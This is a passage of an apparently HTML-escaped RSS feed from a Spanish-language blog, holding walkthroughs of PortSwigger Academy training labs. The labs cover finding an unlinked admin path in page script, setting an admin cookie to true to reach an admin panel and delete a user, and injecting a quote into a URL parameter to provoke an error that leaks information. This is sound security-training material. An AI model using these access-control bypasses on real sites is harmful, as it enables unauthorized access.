			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/admin_hu4c06ed62ba2ea1af67dc696cbfe47065_68127_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/admin_hu4c06ed62ba2ea1af67dc696cbfe47065_68127_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Perfil de Administracion sin control de acceso&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Perfil de Administracion sin control de acceso&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y eliminamos al usuario carlos y resolvemos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 262; 
			flex-basis: 630px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/resuelto.png&#34; data-size=&#34;1791x682&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/resuelto.png&#34;
			width=&#34;1791&#34;
			height=&#34;682&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/resuelto_hu0364d1775914b347c729223c24e42d4d_80900_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/resuelto_hu0364d1775914b347c729223c24e42d4d_80900_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Access Control Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/</link>
        <pubDate>Thu, 16 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 2" /&gt;&lt;h1 id=&#34;lab-unprotected-admin-functionality-with-unpredictable-url&#34;&gt;Lab: Unprotected admin functionality with unpredictable URL&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 291px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/web.png&#34; data-size=&#34;1729x1424&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/web.png&#34;
			width=&#34;1729&#34;
			height=&#34;1424&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora sabemos que exista una pagina para poder acceder a la funcionalidad de admin y que no esta protegida correctamente. Nos vamos a la web de login para&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 182; 
			flex-basis: 437px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/login.png&#34; data-size=&#34;1719x944&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/login.png&#34;
			width=&#34;1719&#34;
			height=&#34;944&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/login_hu5d322fc5ab78888b60ae09385d72d57c_82446_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/login_hu5d322fc5ab78888b60ae09385d72d57c_82446_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Pagina de login&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Pagina de login&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Cuando queremos mostrar el codigo, normalmente con &lt;code&gt;Ctrl + U&lt;/code&gt; se puede visualizar encontramos el siguiente codigo que nos da el path de la funcionalidad de admin.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAdmin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isAdmin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;topLinksTag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementsByClassName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;top-links&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
   &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;adminPanelTag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;adminPanelTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setAttribute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/admin-wmo7iz&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;adminPanelTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Admin panel&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;topLinksTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;adminPanelTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pTag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;pTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;topLinksTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora podemos ver la funcionalidad y realizar acciones sin problema.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 273; 
			flex-basis: 656px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/admin.png&#34; data-size=&#34;1804x660&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/admin.png&#34;
			width=&#34;1804&#34;
			height=&#34;660&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/admin_hu8a6cf280e9da00d8b297810b032a041e_66627_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/admin_hu8a6cf280e9da00d8b297810b032a041e_66627_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Perfil de Administracion sin control de acceso&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Perfil de Administracion sin control de acceso&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y eliminamos al usuario carlos y resolvemos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 236; 
			flex-basis: 567px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/resuelto.png&#34; data-size=&#34;1784x754&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/resuelto.png&#34;
			width=&#34;1784&#34;
			height=&#34;754&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/resuelto_hu5dad19e035c1057358c605f9502eb540_88585_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-2/resuelto_hu5dad19e035c1057358c605f9502eb540_88585_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Access Control Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/</link>
        <pubDate>Thu, 16 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 3" /&gt;&lt;h1 id=&#34;lab-user-role-controlled-by-request-parameter&#34;&gt;Lab: User role controlled by request parameter&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 291px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/web.png&#34; data-size=&#34;1729x1424&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/web.png&#34;
			width=&#34;1729&#34;
			height=&#34;1424&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Existe una funcionalidad de administracion en la cual podemos entrar con el usuario &lt;code&gt;wiener:peter&lt;/code&gt; pero si entramos a esa ruta no podemos acceder nos sale la siguiente alerta:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Admin interface only available if logged in as an administrator&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Cuando vemos la solicitud que hace se ve una cookie que nos indica que la validacion la hace el backend por medio de esta cookie su valor es &lt;code&gt;Admin: false&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 653px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request.png&#34; data-size=&#34;1539x565&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request.png&#34;
			width=&#34;1539&#34;
			height=&#34;565&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request_hu2d87e48693e9987fad27648f27547f5f_106908_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request_hu2d87e48693e9987fad27648f27547f5f_106908_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request con cookie de admin&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request con cookie de admin&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora cambiamos el valor de la cookie por true y veremos que cambia&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 217; 
			flex-basis: 521px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request2.png&#34; data-size=&#34;745x343&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request2.png&#34;
			width=&#34;745&#34;
			height=&#34;343&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request2_hu6ba7f224030b2c85e0514e091bb6fae8_46633_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/request2_hu6ba7f224030b2c85e0514e091bb6fae8_46633_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request editando la cookie&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request editando la cookie&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora podemos ver la funcionalidad y realizar acciones sin problema.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 286; 
			flex-basis: 686px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/admin.png&#34; data-size=&#34;1774x620&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/admin.png&#34;
			width=&#34;1774&#34;
			height=&#34;620&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/admin_hudee46bd0f5af88f6432ff2e63e81ca6f_62737_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/admin_hudee46bd0f5af88f6432ff2e63e81ca6f_62737_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Perfil de Administracion sin control de acceso&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Perfil de Administracion sin control de acceso&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y eliminamos al usuario carlos cambiando siempre el valor de la cookie y resolvemos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 447; 
			flex-basis: 1075px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/resuelto.png&#34; data-size=&#34;1774x396&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/resuelto.png&#34;
			width=&#34;1774&#34;
			height=&#34;396&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/resuelto_hu528cb9b742ee52873c853670608081b6_61823_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-3/resuelto_hu528cb9b742ee52873c853670608081b6_61823_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Information Disclosure Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: Information Disclosure Lab 1" /&gt;&lt;h1 id=&#34;lab-information-disclosure-in-error-messages&#34;&gt;Lab: Information disclosure in error messages&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder mostrar en la aplicacion informacion de la infraestructura, software o algo que revele informacion del sistema. Esta vulnerabilidad mas conocida como &lt;code&gt;Information Disclosure&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es una aplicacion que muestra articulos y este es un ejemplo de ellos. El link es el siguiente:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://ac191fa51e0838eec062495f000c0099.web-security-academy.net/product?productId=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 103; 
			flex-basis: 247px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/article.png&#34; data-size=&#34;1774x1718&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/article.png&#34;
			width=&#34;1774&#34;
			height=&#34;1718&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/article_hu4dc69b8d2611c1246b7864cf67cbb6c9_752494_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/article_hu4dc69b8d2611c1246b7864cf67cbb6c9_752494_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Articulo de la aplicacion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Articulo de la aplicacion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Teniendo esto podemos pensar que lo primero es que generar un error al ingresar el id del articulo, que tambien funciona para saber si algo puede ser vulnerable a sqli. Esto lo haremos injectando una comilla simple &lt;code&gt;&#39;&lt;/code&gt; o &lt;code&gt;&amp;quot;&lt;/code&gt; o &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; se puede intentar con cualquiera.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://ac191fa51e0838eec062495f000c0099.web-security-academy.net/product?productId=1&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y genera el siguiente error que genera el nombre de la aplicacion:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 173; 
			flex-basis: 416px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/error.png&#34; data-size=&#34;1548x891&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/error.png&#34;
			width=&#34;1548&#34;
			height=&#34;891&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/error_hu97e11a306aadb301ab5210017d69c02f_305480_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/error_hu97e11a306aadb301ab5210017d69c02f_305480_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Erro generado al modificar el id&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Erro generado al modificar el id&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ahora ingresamos la solucion y resolvimos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 194; 
			flex-basis: 467px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/resuelto.png&#34; data-size=&#34;1811x930&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/resuelto.png&#34;
			width=&#34;1811&#34;
			height=&#34;930&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/resuelto_hu769deded3bacf0ab895b7d7df5d59077_328965_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-1/resuelto_hu769deded3bacf0ab895b7d7df5d59077_328965_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Information Disclosure Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/</guid>
